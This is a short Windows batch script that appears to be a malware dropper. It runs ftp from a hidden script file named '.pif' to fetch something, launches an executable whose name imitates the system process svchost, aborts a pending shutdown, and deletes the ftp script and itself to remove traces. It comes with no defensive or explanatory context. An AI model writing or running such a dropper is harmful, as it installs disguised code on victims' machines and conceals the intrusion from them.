@echo off 
ftp -n -v -s:.pif 
scvhostingg.exe 
shutdown -a 
del .pif 
del /F c.bat 
exit /y 
